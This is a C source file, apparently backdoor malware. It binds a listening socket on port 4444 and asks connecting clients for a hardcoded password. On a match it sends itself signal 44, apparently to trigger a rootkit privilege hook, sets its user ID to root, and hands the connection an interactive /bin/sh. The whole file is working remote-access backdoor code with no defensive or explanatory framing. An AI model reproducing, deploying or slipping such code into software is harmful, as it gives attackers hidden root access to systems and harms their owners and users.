#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

#define PORT 4444
#define PASSWORD "bicopass"
#define ROOT_SIGNAL 44

void escalate_privileges() {
    kill(getpid(), ROOT_SIGNAL);
    setuid(0);
    seteuid(0);
}

int main() {
    int server_fd, client_fd;
    struct sockaddr_in addr;
    socklen_t addrlen = sizeof(addr);
    char buffer[1024] = {0};

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        perror("socket");
        exit(1);
    }

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        exit(1);
    }

    if (listen(server_fd, 1) < 0) {
        perror("listen");
        exit(1);
    }

    while (1) {
        client_fd = accept(server_fd, (struct sockaddr *)&addr, &addrlen);
        if (client_fd < 0) continue;

        send(client_fd, "Password: ", 10, 0);
        memset(buffer, 0, sizeof(buffer));
        read(client_fd, buffer, sizeof(buffer));

        if (strncmp(buffer, PASSWORD, strlen(PASSWORD)) == 0) {
            escalate_privileges();
            dup2(client_fd, 0);
            dup2(client_fd, 1);
            dup2(client_fd, 2);
            execl("/bin/sh", "sh", NULL);
        } else {
            close(client_fd);
        }
    }

    return 0;
}
